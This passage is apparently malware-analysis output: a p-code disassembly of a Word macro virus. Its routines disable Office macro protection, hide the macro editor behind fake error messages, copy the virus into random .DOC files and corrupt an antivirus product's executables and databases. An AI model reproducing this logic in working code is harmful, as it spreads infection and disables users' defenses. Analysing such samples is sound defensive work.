' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	StartWithExpr 
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #93:
' 	ArgsMemCallWith Display 0x0000 
' Line #94:
' 	MemLdWith New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #95:
' 	MemLdWith New 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #96:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith ReadOnly 
' Line #97:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #98:
' 	ArgsMemCallWith Execute 0x0000 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	EndWith 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub AutoSave())
' Line #103:
' 	ArgsCall Document_Open 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Private Sub Auto_Save())
' Line #106:
' 	ArgsCall Document_Open 0x0000 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #109:
' 	ArgsCall Document_Open 0x0000 
' Line #110:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #113:
' 	ArgsCall Document_Open 0x0000 
' Line #114:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Private Sub FileTemplates())
' Line #117:
' 	ArgsCall Document_Open 0x0000 
' Line #118:
' 	LitStr 0x001A "Global template not loaded"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Private Sub ToolsOptions())
' Line #121:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #122:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #123:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Private Function Gds(id_FFFE As String) As String)
' Line #126:
' 	Dim (Const) 
' 	LitStr 0x0002 ":\"
' 	VarDefn Rt
' Line #127:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #128:
' 	Dim 
' 	VarDefn St (As String)
' Line #129:
' 	Dim 
' 	VarDefn i (As Byte)
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	Ld Friend 
' 	St FileNum 
' Line #132:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #133:
' 	LitDI2 0x0042 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rt 
' 	Concat 
' 	LitDI2 0x0060 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St St 
' Line #134:
' 	Ld St 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #135:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #136:
' 	Ld St 
' 	ArgsCall Kill 0x0001 
' Line #137:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Gds 
' 	LitDI2 0x0042 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Gds 
' 	Else 
' 	BoSImplicit 
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' 	EndIf 
' Line #138:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' 	EndFunc 
' Line #140:
' 	FuncDefn (Private Function Rdd(ByVal Path As String, id_FFFE As String) As String)
' Line #141:
' 	Dim (Const) 
' 	LitStr 0x0003 "*.*"
' 	VarDefn Maska
' Line #142:
' 	Dim 
' 	VarDefn n (As Integer)
' 	VarDefn i (As Integer)
' Line #143:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0FA0 
' 	VarDefn Buf (As String)
' Line #144:
' 	Dim 
' 	VarDefn FindNmi (As String)
' Line #145:
' 	LitDI2 0x0000 
' 	St n 
' Line #146:
' 	LitDI2 0x0001 
' 	St i 
' Line #147:
' 	Ld Path 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Path 
' 	EndIf 
' Line #148:
' 	OnError Errs 
' Line #149:
' 	Ld Path 
' 	LitDI2 0x0017 
' 	ArgsLd Dir 0x0002 
' 	St FindNmi 
' Line #150:
' 	Ld FindNmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #151:
' 	Ld Path 
' 	Ld FindNmi 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #152:
' 	Ld FindNmi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	IfBlock 
' Line #153:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #154:
' 	Ld FindNmi 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #155:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	Ld Dir 
' 	St FindNmi 
' Line #159:
' 	Loop 
' Line #160:
' 	Ld Path 
' 	Ld n 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Buf 0x0001 
' 	Concat 
' 	ArgsLd UCase 0x0001 
' 	St Rdd 
' Line #161:
' 	Label Errs 
' Line #162:
' 	Ld n 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Rdd 
' 	EndIf 
' Line #163:
' 	EndFunc 
' Line #164:
' 	FuncDefn (Private Function Rdr(ByVal Path As String, id_FFFE As String) As String)
' Line #165:
' 	Dim (Const) 
' 	LitStr 0x0001 ":"
' 	VarDefn Root
' Line #166:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #167:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #168:
' 	Dim 
' 	VarDefn GetRandom (As Integer)
' Line #169:
' 	Dim 
' 	VarDefn RandStep (As Integer)
' Line #170:
' 	LitDI2 0x03E9 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St GetRandom 
' Line #171:
' 	LitDI2 0x0000 
' 	St RandStep 
' Line #172:
' Line #173:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #174:
' 	Ld Path 
' 	ArgsLd Rdd 0x0001 
' 	St tmp 
' Line #175:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld tmp 
' 	St Path 
' 	EndIf 
' Line #176:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #177:
' 	LitStr 0x0000 ""
' 	St Rdr 
' Line #178:
' 	ExitFunc 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #181:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Rdr 
' Line #182:
' 	ExitFunc 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld RandStep 
' 	SelectCase 
' Line #185:
' 	LitDI2 0x0000 
' 	LitDI2 0x00C8 
' 	CaseTo 
' 	CaseDone 
' Line #186:
' 	Ld RandStep 
' 	LitDI2 0x00C8 
' 	Add 
' 	St RandStep 
' Line #187:
' 	LitDI2 0x0190 
' 	LitDI2 0x0258 
' 	CaseTo 
' 	CaseDone 
' Line #188:
' 	Ld RandStep 
' 	LitDI2 0x0064 
' 	Add 
' 	St RandStep 
' Line #189:
' 	LitDI2 0x02BC 
' 	LitDI2 0x0384 
' 	CaseTo 
' 	CaseDone 
' Line #190:
' 	Ld RandStep 
' 	LitDI2 0x0032 
' 	Add 
' 	St RandStep 
' Line #191:
' 	EndSelect 
' Line #192:
' 	Ld RandStep 
' 	Ld GetRandom 
' 	Ge 
' 	IfBlock 
' Line #193:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Rdr 
' Line #194:
' 	ExitFunc 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' 	EndFunc 
' Line #198:
' 	FuncDefn (Private Function Rfe(ByVal Path As String, Maska As String, id_FFFE As String) As String)
' Line #199:
' 	Dim 
' 	VarDefn n (As Integer)
' 	VarDefn i (As Integer)
' Line #200:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0FA0 
' 	VarDefn Buf (As String)
' Line #201:
' 	Dim 
' 	VarDefn FindNmi (As String)
' Line #202:
' 	LitDI2 0x0000 
' 	St n 
' Line #203:
' 	LitDI2 0x0001 
' 	St i 
' Line #204:
' 	Ld Path 
' 	Ld Maska 
' 	Concat 
' 	St Path 
' Line #205:
' 	OnError Errs 
' Line #206:
' 	Ld Path 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St FindNmi 
' Line #207:
' 	Ld FindNmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #208:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #209:
' 	Ld FindNmi 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #210:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #211:
' 	Ld Dir 
' 	St FindNmi 
' Line #212:
' 	Loop 
' Line #213:
' 	Ld n 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Buf 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St Rfe 
' Line #214:
' 	Label Errs 
' Line #215:
' 	Ld n 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Rfe 
' 	EndIf 
' Line #216:
' 	EndFunc 
' Line #217:
' 	FuncDefn (Private Sub Dfe(Path As String))
' Line #218:
' 	Dim 
' 	VarDefn Attr (As Integer)
' Line #219:
' 	Dim 
' 	VarDefn Siz (As Long)
' 	VarDefn Cmp (As Long)
' Line #220:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #221:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #222:
' 	Dim 
' 	VarDefn Ofs (As Byte)
' Line #223:
' 	OnError Ends 
' Line #224:
' 	Ld Path 
' 	ArgsLd FileLen 0x0001 
' 	St Siz 
' Line #225:
' 	Ld Siz 
' 	LitDI2 0x000B 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #226:
' 	Ld Path 
' 	ArgsLd GetAttr 0x0001 
' 	St Attr 
' Line #227:
' 	Ld Path 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #228:
' 	Ld Friend 
' 	St FileNum 
' Line #229:
' 	Ld Path 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #230:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0009 
' 	St Ofs 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St Ofs 
' 	EndIf 
' Line #231:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Siz 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	GetRec 
' Line #232:
' 	Ld Siz 
' 	Ld Cmp 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #233:
' 	Ld Siz 
' 	St Cmp 
' Line #234:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x7FFB 
' 	St Siz 
' 	EndIf 
' Line #235:
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	RedimAs Buf 0x0001 (As Byte)
' Line #236:
' 	LitDI2 0x0064 
' 	UMi 
' 	Paren 
' 	ArgsCall Rnd 0x0001 
' Line #237:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	GetRec 
' Line #238:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	For 
' Line #239:
' 	Ld i 
' 	ArgsLd Buf 0x0001 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Add 
' 	FnInt 
' 	Xor 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #240:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #241:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	PutRec 
' Line #242:
' 	Ld Cmp 
' 	Ld Ofs 
' 	Add 
' 	St Cmp 
' Line #243:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Cmp 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	PutRec 
' Line #244:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #245:
' 	Ld Path 
' 	Ld Attr 
' 	ArgsCall SetAttr 0x0002 
' Line #246:
' 	Label Ends 
' Line #247:
' 	EndSub 
' Line #248:
' 	FuncDefn (Private Sub Rcy(Sours As String))
' Line #249:
' 	Dim 
' 	VarDefn Fls (As String)
' 	VarDefn DirR (As String)
' Line #250:
' 	Dim 
' 	VarDefn k (As Long)
' 	VarDefn Er (As Integer)
' 	VarDefn a (As Integer)
' Line #251:
' 	OnError YYY 
' Line #252:
' 	Do 
' Line #253:
' 	Ld Gds 
' 	St Fls 
' Line #254:
' 	Ld Fls 
' 	Ld Fls 
' 	FnLen 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Rdr 0x0001 
' 	St DirR 
' Line #255:
' 	Ld DirR 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd Rfe 0x0002 
' 	St Fls 
' Line #256:
' 	Ld Er 
' 	LitDI2 0x0001 
' 	Add 
' 	St Er 
' Line #257:
' 	Ld Er 
' 	LitDI2 0x000A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #258:
' 	Ld Fls 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #259:
' 	LitDI2 0x0001 
' 	Ld Fls 
' 	LitStr 0x0001 "."
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	St k 
' Line #260:
' 	Ld k 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #261:
' 	Ld Fls 
' 	Ld Fls 
' 	FnLen 
' 	Ld Fls 
' 	FnLen 
' 	Ld k 
' 	Sub 
' 	Paren 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St Fls 
' Line #262:
' 	EndIfBlock 
' Line #263:
' 	Ld Fls 
' 	LitStr 0x0004 ".DOC"
' 	Concat 
' 	St Fls 
' Line #264:
' 	Ld DirR 
' 	Ld Fls 
' 	Concat 
' 	St DirR 
' Line #265:
' 	Ld DirR 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #266:
' 	LitDI2 0x0001 
' 	St a 
' Line #267:
' 	Ld DirR 
' 	ArgsLd GetAttr 0x0001 
' 	St Er 
' Line #268:
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	Ld Sours 
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsLd CF& 0x0003 
' 	St k 
' Line #271:
' 	Ld a 
' 	If 
' 	BoSImplicit 
' 	Ld DirR 
' 	Ld Er 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #272:
' 	Label YYY 
' Line #273:
' 	EndSub 
' Line #274:
' 	FuncDefn (Private Sub Dpio())
' Line #275:
' 	Dim (Const) 
' 	LitStr 0x001B "\Software\Microsoft\Office\"
' 	VarDefn Path
' Line #276:
' 	Dim (Const) 
' 	LitStr 0x0004 "8.0\"
' 	VarDefn Ver
' Line #277:
' 	Dim (Const) 
' 	LitStr 0x0012 "New User Settings\"
' 	VarDefn NewUse
' Line #278:
' 	Dim (Const) 
' 	LitStr 0x0009 "\.Default"
' 	VarDefn Def
' Line #279:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Keys (As String)
' Line #280:
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	LitDI2 0x0001 
' 	ArgsSt Keys 0x0001 
' Line #281:
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	LitDI2 0x0002 
' 	ArgsSt Keys 0x0001 
' Line #282:
' 	LitStr 0x000A "HKEY_USERS"
' 	LitDI2 0x0003 
' 	ArgsSt Keys 0x0001 
' Line #283:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Dis (As String)
' Line #284:
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	LitDI2 0x0001 
' 	ArgsSt Dis 0x0001 
' Line #285:
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0002 
' 	ArgsSt Dis 0x0001 
' Line #286:
' 	LitStr 0x0014 "MacroVirusProtection"
' 	LitDI2 0x0003 
' 	ArgsSt Dis 0x0001 
' Line #287:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	VarDefn AddId (As String)
' Line #288:
' 	LitStr 0x000C "Word\Options"
' 	LitDI2 0x0001 
' 	ArgsSt AddId 0x0001 
' Line #289:
' 	LitStr 0x0015 "Excel\Microsoft Excel"
' 	LitDI2 0x0002 
' 	ArgsSt AddId 0x0001 
' Line #290:
' 	LitStr 0x0012 "PowerPoint\Options"
' 	LitDI2 0x0003 
' 	ArgsSt AddId 0x0001 
' Line #291:
' 	LitStr 0x0010 "Word\7.0\Options"
' 	LitDI2 0x0004 
' 	ArgsSt AddId 0x0001 
' Line #292:
' 	LitStr 0x0019 "Excel\7.0\Microsoft Excel"
' 	LitDI2 0x0005 
' 	ArgsSt AddId 0x0001 
' Line #293:
' 	LitStr 0x0016 "PowerPoint\7.0\Options"
' 	LitDI2 0x0006 
' 	ArgsSt AddId 0x0001 
' Line #294:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #295:
' 	Dim 
' 	VarDefn k (As Integer)
' Line #296:
' 	Dim 
' 	VarDefn x (As Integer)
' Line #297:
' 	Dim 
' 	VarDefn Use (As String)
' Line #298:
' 	OnError (Resume Next) 
' Line #299:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #300:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0021 "\System\CurrentControlSet\control"
' 	Concat 
' 	LitStr 0x000C "Current User"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St Use 
' Line #301:
' 	Ld Use 
' 	LitStr 0x0008 ".Default"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St x 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St x 
' 	EndIf 
' Line #302:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #303:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #304:
' 	Ld k 
' 	SelectCase 
' Line #305:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #306:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #307:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #308:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #309:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #310:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #311:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #312:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #313:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #314:
' 	EndSelect 
' Line #315:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #316:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #317:
' 	EndWith 
' Line #318:
' 	EndSub 
' Line #319:
' 	FuncDefn (Private Sub Asd())
' Line #320:
' 	Dim (Const) 
' 	LitStr 0x002E "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	VarDefn Path1
' Line #321:
' 	Dim (Const) 
' 	LitStr 0x002D "\System\CurrentControlSet\Services\VxD\SpIDer"
' 	VarDefn Path2
' Line #322:
' 	Dim (Const) 
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	VarDefn Key
' Line #323:
' 	Dim (Const) 
' 	LitStr 0x000A "RUNDLL.EXE"
' 	VarDefn RN
' Line #324:
' 	Dim 
' 	VarDefn Nmi (As String)
' Line #325:
' 	Dim 
' 	VarDefn ProgPath (As String)
' Line #326:
' 	OnError (Resume Next) 
' Line #327:
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Nmi 
' Line #328:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #329:
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld Nmi 
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St ProgPath 
' Line #330:
' 	Ld ProgPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld ProgPath 
' 	Ld RN 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #331:
' 	Ld RN 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld Nmi 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #332:
' 	LitStr 0x0004 "*IOS"
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path2 
' 	Concat 
' 	LitStr 0x0009 "StaticVxD"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #333:
' 	Ld ProgPath 
' 	ArgsLd Ptd 0x0001 
' 	St ProgPath 
' Line #334:
' 	Ld ProgPath 
' 	LitStr 0x0005 "*.EXE"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St Nmi 
' Line #335:
' 	Ld Nmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #336:
' 	Ld ProgPath 
' 	Ld Nmi 
' 	Concat 
' 	Paren 
' 	ArgsCall Dfe 0x0001 
' Line #337:
' 	Ld Dir 
' 	St Nmi 
' Line #338:
' 	Loop 
' Line #339:
' 	Ld ProgPath 
' 	LitStr 0x0005 "*.VDB"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St Nmi 
' Line #340:
' 	Ld Nmi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #341:
' 	Ld ProgPath 
' 	Ld Nmi 
' 	Concat 
' 	Paren 
' 	ArgsCall Dfe 0x0001 
' Line #342:
' 	Ld Dir 
' 	St Nmi 
' Line #343:
' 	Loop 
' Line #344:
' 	EndIfBlock 
' Line #345:
' 	EndWith 
' Line #346:
' 	EndSub 
' Line #347:
' 	FuncDefn (Private Function Ptd(Path As String, id_FFFE As String) As String)
' Line #348:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #349:
' 	Dim 
' 	VarDefn i (As Long)
' 	VarDefn k (As Long)
' Line #350:
' 	OnError Sti 
' Line #351:
' 	Ld Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sti 
' 	EndIf 
' Line #352:
' 	Ld Path 
' 	FnLen 
' 	St k 
' Line #353:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld k 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #354:
' 	Ld Path 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #355:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #356:
' 	Ld Path 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	St Ptd 
' Line #357:
' 	ExitFunc 
' Line #358:
' 	Label Sti 
' Line #359:
' 	LitStr 0x0000 ""
' 	St Ptd 
' Line #360:
' 	EndFunc 
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' Line #368:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
